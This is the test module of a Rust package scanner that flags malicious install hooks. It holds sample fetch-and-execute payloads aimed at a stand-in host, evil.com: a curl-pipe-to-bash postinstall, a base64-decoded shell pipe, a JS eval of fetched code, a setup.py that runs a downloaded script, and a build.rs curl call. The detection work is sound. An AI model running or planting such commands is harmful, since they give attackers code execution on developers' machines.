// ... existing code ...

#[cfg(test)]
mod tests {
    use super::*;
    use shared::Severity;

    #[tokio::test]
    async fn test_npm_malicious_postinstall() {
        let scanner = PackageScanner::new();
        
        let threats = scanner.scan_npm_script(
            &std::path::PathBuf::from("/tmp/test/package.json"),
            "postinstall",
            "curl http://evil.com/script.sh | bash"
        ).await;
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "NPM_SCRIPT_DOWNLOAD_EXECUTE");
        assert_eq!(threats[0].severity, Severity::Critical);
    }

    #[tokio::test]
    async fn test_npm_base64_obfuscation() {
        let scanner = PackageScanner::new();
        
        let threats = scanner.scan_npm_script(
            &std::path::PathBuf::from("/tmp/test/package.json"),
            "postinstall",
            "echo 'd2hvYW1p' | base64 -d | sh"
        ).await;
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "NPM_SCRIPT_OBFUSCATED");
    }

    #[tokio::test]
    async fn test_js_network_exec() {
        let scanner = PackageScanner::new();
        
        let js_content = r#"
        const https = require('https');
        https.get('http://evil.com/script.js', (res) => {
            eval(res.body);
        });
        "#;
        
        let temp_file = std::path::PathBuf::from("/tmp/test_script.js");
        std::fs::write(&temp_file, js_content).unwrap();
        
        let threats = scanner.scan_js_file(&temp_file).await.unwrap();
        
        assert!(!threats.is_empty());
        
        std::fs::remove_file(&temp_file).ok();
    }

    #[tokio::test]
    async fn test_pip_setup_py_network() {
        let scanner = PackageScanner::new();
        
        let setup_py_content = r#"
        import subprocess
        import urllib.request
        subprocess.call(['bash', '-c', urllib.request.urlopen('http://evil.com/script.sh').read()])
        "#;
        
        let temp_file = std::path::PathBuf::from("/tmp/test_setup.py");
        std::fs::write(&temp_file, setup_py_content).unwrap();
        
        let threats = scanner.scan_setup_py(&temp_file).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "SETUP_PY_NETWORK_EXEC");
        
        std::fs::remove_file(&temp_file).ok();
    }

    #[tokio::test]
    async fn test_cargo_build_rs_network() {
        let scanner = PackageScanner::new();
        
        let build_rs_content = r#"
        use std::process::Command;
        Command::new("curl").arg("http://evil.com/script.sh").spawn();
        "#;
        
        let temp_file = std::path::PathBuf::from("/tmp/test_build.rs");
        std::fs::write(&temp_file, build_rs_content).unwrap();
        
        let threats = scanner.scan_build_rs(&temp_file).await.unwrap();
        
        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "BUILD_RS_NETWORK");
        
        std::fs::remove_file(&temp_file).ok();
    }
}
